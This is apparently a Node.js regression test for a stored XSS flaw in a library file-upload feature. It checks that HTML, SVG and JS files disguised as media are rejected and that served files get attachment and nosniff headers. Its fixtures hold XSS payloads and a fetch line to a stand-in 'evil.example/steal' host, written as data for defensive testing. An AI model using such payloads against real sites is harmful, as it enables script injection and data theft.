// Permanent regression test for a CRITICAL Stored XSS found in a full
// production audit of the Library feature: an HTML file disguised as an
// allowed media MIME type (e.g. video/mp4) was accepted as a book file,
// stored, and served back with Content-Type: text/html and
// Content-Disposition: inline -- a real browser executed the embedded
// <script>, confirmed live (screenshot evidence in the audit).
//
// Root cause: utils/fileTypeCheck.js's "media" category (used for the
// Library's book-file upload alongside pdf/office/image) only checked
// `buf.length > 16` -- any non-empty, non-dangerous-signature file passed,
// including plain HTML. Fixed with real content-signature checks for
// every audio/video format this app actually allows (MP4/MOV via the ISO
// Base Media "ftyp" box, WAV via RIFF/WAVE, MP3 via ID3v2 or a raw frame
// sync). The serving route (routes/files.js) was also hardened
// independently: X-Content-Type-Options: nosniff on every response, and
// Content-Disposition forced to `attachment` (never `inline`) for any
// extension outside a small inline-safe allowlist, regardless of what
// validated it or how it got onto disk -- defense in depth, not reliant
// on upload-time validation alone.
//
// This test must fail again if either layer regresses -- it exercises
// both independently.
//
// Run: node tests/library-file-security.test.js (dev server must be running)

const http = require("http");
const fs = require("fs");
const path = require("path");
const jwt = require("jsonwebtoken");
const cfg = require(path.join(__dirname, "..", "src", "config"));
const { pool } = require(path.join(__dirname, "..", "src", "db"));

const BASE = "http://localhost:3000";
const results = [];
async function test(name, fn) {
  try {
    await fn();
    results.push({ name, ok: true });
    console.log(`  ✓ ${name}`);
  } catch (err) {
    results.push({ name, ok: false, error: err.message });
    console.log(`  ✗ ${name}`);
    console.log(`      ${err.message}`);
  }
}
function assert(cond, msg) {
  if (!cond) throw new Error(msg || "assertion failed");
}
function tokenFor(id, role) { return jwt.sign({ id, role }, cfg.jwtSecret, { expiresIn: "1h" }); }

function sig(bytes, filler) { return Buffer.concat([Buffer.from(bytes), Buffer.from(filler || "", "utf8")]); }

function multipartUpload(token, fields, fileField) {
  return new Promise((resolve, reject) => {
    const boundary = "----zzlibsec" + Date.now() + Math.random().toString(36).slice(2);
    const chunks = [];
    const push = (s) => chunks.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "utf8"));
    for (const [k, v] of Object.entries(fields)) push(`--${boundary}\r\nContent-Disposition: form-data; name="${k}"\r\n\r\n${v}\r\n`);
    if (fileField) {
      push(`--${boundary}\r\nContent-Disposition: form-data; name="${fileField.name}"; filename="${fileField.filename}"\r\nContent-Type: ${fileField.contentType}\r\n\r\n`);
      push(fileField.content);
      push("\r\n");
    }
    push(`--${boundary}--\r\n`);
    const body = Buffer.concat(chunks);
    const req = http.request(
      `${BASE}/api/library/books`,
      { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": body.length } },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => { let json = null; try { json = raw ? JSON.parse(raw) : null; } catch {} resolve({ status: res.statusCode, body: json }); });
      }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

function rawFileRequest(urlPath, token) {
  return new Promise((resolve, reject) => {
    const req = http.request(BASE + urlPath, { method: "GET", headers: token ? { Authorization: `Bearer ${token}` } : {} }, (res) => {
      let raw = "";
      res.on("data", (c) => (raw += c));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: raw }));
    });
    req.on("error", reject);
    req.end();
  });
}

let fx = { groupId: null, totId: null };

async function wipe() {
  const idSub = "SELECT id FROM user_credentials WHERE member_code LIKE 'ZZLIBSEC%'";
  const { rows: materialRows } = await pool.query(`SELECT filename FROM learning_materials WHERE supervisor_id IN (${idSub})`);
  for (const m of materialRows) {
    if (m.filename) { try { fs.unlinkSync(path.join(cfg.uploadsDir, "materials", m.filename)); } catch {} }
  }
  await pool.query(`DELETE FROM learning_materials WHERE supervisor_id IN (${idSub})`);
  await pool.query("DELETE FROM supervisors WHERE id IN (SELECT id FROM user_credentials WHERE member_code LIKE 'ZZLIBSEC%')");
  await pool.query("DELETE FROM user_credentials WHERE member_code LIKE 'ZZLIBSEC%'");
  await pool.query("DELETE FROM trainer_groups WHERE name LIKE 'ZZLIBSEC%'");
}

async function setup() {
  await wipe();
  const grp = await pool.query("INSERT INTO trainer_groups (name) VALUES ('ZZLIBSEC Group')");
  fx.groupId = grp.insertId;
  const tot = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBSECTOT', 'x', 'supervisor', 'active')");
  fx.totId = tot.insertId;
  await pool.query("INSERT INTO supervisors (id, full_name, supervisor_type, group_id) VALUES (?, 'ZZLIBSEC ToT', 'primary', ?)", [fx.totId, fx.groupId]);
}

async function main() {
  console.log("Setting up isolated ZZLIBSEC fixtures...\n");
  await setup();
  const token = tokenFor(fx.totId, "supervisor");

  console.log("\nStored XSS fix -- the exact original attack, 1:1\n");

  await test("The exact original exploit (HTML file, .html, spoofed as video/mp4) is rejected (400)", async () => {
    const r = await multipartUpload(
      token, { title: "ZZLIBSEC Original Exploit", author: "x", resourceType: "book" },
      { name: "file", filename: "evil.html", contentType: "video/mp4", content: "<html><body><script>window.__xss='pwned'</script></body></html>" }
    );
    assert(r.status === 400, `expected 400, got ${r.status} (body: ${JSON.stringify(r.body)})`);
  });

  await test("No Library record was created by the rejected exploit", async () => {
    const { rows } = await pool.query("SELECT COUNT(*) AS c FROM learning_materials WHERE title = 'ZZLIBSEC Original Exploit'");
    assert(Number(rows[0].c) === 0, `expected 0 rows, got ${rows[0].c}`);
  });

  await test("No orphan file was left on disk by the rejected exploit", async () => {
    const before = fs.readdirSync(path.join(cfg.uploadsDir, "materials")).length;
    // Re-attempt, then compare -- isolates this specific check from
    // whatever else happens to be in the shared materials directory.
    await multipartUpload(token, { title: "ZZLIBSEC Orphan Check", author: "x", resourceType: "book" }, { name: "file", filename: "evil2.html", contentType: "video/mp4", content: "<html><script>x</script></html>" });
    const after = fs.readdirSync(path.join(cfg.uploadsDir, "materials")).length;
    assert(after === before, `materials dir had ${before} files before, ${after} after -- a rejected upload left an orphan`);
  });

  console.log("\nActive-content variants (not just the one exact payload)\n");

  const attacks = [
    { label: "HTML as .pdf", filename: "fake.pdf", contentType: "application/pdf", content: "<html><script>1</script></html>" },
    { label: "HTML as .mp4", filename: "fake.mp4", contentType: "video/mp4", content: "<html><script>1</script></html>" },
    { label: "SVG with <script>, as .jpg", filename: "evil.jpg", contentType: "image/jpeg", content: "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>" },
    { label: "SVG with onload=, as .png", filename: "evil.png", contentType: "image/png", content: "<svg onload='alert(1)'></svg>" },
    { label: "Raw JS file, as .mp3", filename: "evil.js", contentType: "audio/mpeg", content: "fetch('https://evil.example/steal')" },
    { label: "Windows PE (MZ header), as .pdf", filename: "evil.pdf", contentType: "application/pdf", content: sig([0x4d, 0x5a, 0x90, 0x00]) },
  ];
  for (const atk of attacks) {
    await test(`[${atk.label}] rejected (400)`, async () => {
      const r = await multipartUpload(token, { title: `ZZLIBSEC Variant: ${atk.label}`, author: "x", resourceType: "book" }, { name: "file", filename: atk.filename, contentType: atk.contentType, content: atk.content });
      assert(r.status === 400, `expected 400, got ${r.status}`);
    });
  }

  console.log("\nServing-layer defense in depth\n");

  await test("A file with a real DB row but a non-safe extension is served as attachment, not inline (even though upload-time validation now prevents this from happening via POST /books -- this is the independent second layer)", async () => {
    const probeFilename = "zzlibsec-probe-" + Date.now() + ".html";
    const probePath = path.join(cfg.uploadsDir, "materials", probeFilename);
    fs.writeFileSync(probePath, "<html><script>alert(1)</script></html>");
    const row = await pool.query(
      "INSERT INTO learning_materials (supervisor_id, title, author, material_type, filename, original_name, resource_type) VALUES (?,?,?,?,?,?,?)",
      [fx.totId, "ZZLIBSEC Probe", "x", "book", probeFilename, "probe.html", "book"]
    );
    try {
      const served = await rawFileRequest(`/uploads/materials/${probeFilename}`, token);
      assert(served.status === 200, `expected the file to be reachable (200), got ${served.status}`);
      assert((served.headers["content-disposition"] || "").startsWith("attachment"), `expected attachment, got: ${served.headers["content-disposition"]}`);
      assert(served.headers["x-content-type-options"] === "nosniff", `expected nosniff, got: ${served.headers["x-content-type-options"]}`);
    } finally {
      await pool.query("DELETE FROM learning_materials WHERE id = ?", [row.insertId]);
      fs.unlinkSync(probePath);
    }
  });

  console.log("\nLegitimate files still work (every genuinely supported format)\n");

  const legit = [
    { label: "PDF", filename: "real.pdf", contentType: "application/pdf", content: Buffer.from("%PDF-1.4\nreal content " + Math.random()) },
    { label: "JPEG", filename: "real.jpg", contentType: "image/jpeg", content: sig([0xff, 0xd8, 0xff, 0xe0], "jpegdata" + Math.random()) },
    { label: "PNG", filename: "real.png", contentType: "image/png", content: sig([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], "pngdata" + Math.random()) },
    { label: "MP4 (ftyp box)", filename: "real.mp4", contentType: "video/mp4", content: sig([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6f, 0x6d], "mp4data" + Math.random()) },
    { label: "WAV (RIFF/WAVE)", filename: "real.wav", contentType: "audio/wav", content: sig([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45], "wavdata" + Math.random()) },
    { label: "MP3 (ID3v2)", filename: "real.mp3", contentType: "audio/mpeg", content: sig([0x49, 0x44, 0x33, 0x03], "mp3data" + Math.random()) },
    { label: "DOCX (OOXML zip)", filename: "real.docx", contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", content: sig([0x50, 0x4b, 0x03, 0x04], "zipdata" + Math.random()) },
  ];
  for (const lf of legit) {
    await test(`[${lf.label}] accepted (201), downloadable, and served inline when it's on the safe list`, async () => {
      const r = await multipartUpload(token, { title: `ZZLIBSEC Legit: ${lf.label}`, author: "x", resourceType: "book" }, { name: "file", filename: lf.filename, contentType: lf.contentType, content: lf.content });
      assert(r.status === 201, `expected 201, got ${r.status} (body: ${JSON.stringify(r.body)})`);
      const served = await rawFileRequest(`/uploads/materials/${r.body.filename}`, token);
      assert(served.status === 200, `file did not download: ${served.status}`);
    });
  }

  console.log("\nTearing down ZZLIBSEC fixtures...");
  await wipe();
  const { rows: leftover } = await pool.query("SELECT COUNT(*) AS c FROM user_credentials WHERE member_code LIKE 'ZZLIBSEC%'");
  console.log(`Teardown verification: ${leftover[0].c} leftover ZZLIBSEC accounts (should be 0).`);

  const passed = results.filter((r) => r.ok).length;
  console.log("\n" + "=".repeat(60));
  console.log(`${passed}/${results.length} passed`);
  console.log("=".repeat(60));
  if (passed !== results.length) process.exit(1);
}

main().catch(async (err) => {
  console.error("FATAL:", err);
  try { await wipe(); } catch {}
  process.exit(1);
});
